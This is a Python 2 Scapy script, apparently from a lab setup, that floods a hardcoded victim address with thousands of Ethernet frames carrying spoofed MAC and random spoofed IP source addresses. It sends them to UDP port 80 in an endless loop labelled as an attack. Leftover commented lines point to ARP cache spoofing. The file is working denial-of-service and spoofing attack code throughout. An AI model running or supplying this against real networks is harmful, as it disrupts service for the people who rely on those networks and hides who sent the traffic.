from scapy.all import *

import time
from os import popen
from random import randrange
import signal

def getmac(targetip):
  arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
  targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
  return targetmac

def restorearp(targetip, targetmac, sourceip, sourcemac):
  packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
  send(packet, verbose=False)
  print "ARP Table restored to normal for", targetip


def srcMACgen(total=10000):
  src=[]
  dst=[]
  i=0
  for y in xrange(0,254):
    for x in xrange(0,254):
      pack=intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(y) + ":" + intToStr(x)
      pack2=intToStr(0) + ":" + intToStr(0) + ":" + intToStr(x) + ":" + intToStr(y) + ":" + intToStr(0) + ":" + intToStr(0)
      src.append(pack)
      dst.append(pack2)
      i+=1
      if total <= i :
        return src,dst
        break
  return src,dst
def intToStr(var):
  if var < 16:
    a = hex(var).replace("x","")
  else:
    a = hex(var)[2:]
  return a  
def exit_gracefully(self,signum, frame):
    raise KeyboardInterrupt()

def generate_packets():
    packet_list = []        #initializing packet_list to hold all the packets
    src,dst=srcMACgen()
    for i in xrange(0,9000):
        packet  = Ether(dst=src[i],src=dst[i])/IP(dst=sourceIPgen(),src=sourceIPgen())/UDP(dport=80) 
        packet_list.append(packet)
    return packet_list
def main():
  # signal.signal(signal.SIGINT, exit_gracefully)
  # targetip= raw_input("Enter Target IP:")
  # targetip="10.0.0.4"
  victimip="10.0.0.1"
  # try:
  #   targetmac= getmac(targetip)
  #   print "Target MAC", targetmac
  # except:
  #   print "Target machine did not respond to ARP broadcast"
  #   quit()
  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()

  
  try:
    victimmac= getmac(victimip)
    print "victim MAC", victimmac
  except:
    print "victim machine did not respond to ARP broadcast"
    quit()
  
  print "prepare packets"
  # print "generate address"
  # src,dst=srcMACgen(11000)
  # print len(src)
  # print len(dst)

  packet_list=[]
  
  packets = generate_packets()
  packet_list.append(packets)



  print "launch attack"
  try:
    print "Sending spoofed SYN responses"
    while True:
      # spoofed = Ether()/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
      # packets = Ether(src=RandMAC())/IP(dst='10.0.0.2',src=sourceIPgen())/UDP(dport=1,sport=80)
      # sendp(packets,iface=interface.rstrip(), verbose= False,inter=1)
      
      for packets in packet_list:
        sendp( packets,iface=interface.rstrip(), verbose=0)

      
      # spoofarpcache(gatewayip, gatewaymac, targetip)
  except KeyboardInterrupt:
    print "SYN spoofing stopped"
    
    # restorearp(gatewayip, gatewaymac, targetip, targetmac)
    # restorearp(targetip, targetmac, gatewayip, gatewaymac)
    quit()

def sourceIPgen():

#this function generates random IP addresses
# these values are not valid for first octet of IP address

  not_valid = [10,127,254,255,1,2,169,172,192]

  first = randrange(1,256)


  while first in not_valid:
    first = randrange(1,256)
    # print first
  ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
  # print ip
  return ip

if __name__=="__main__":
  main()
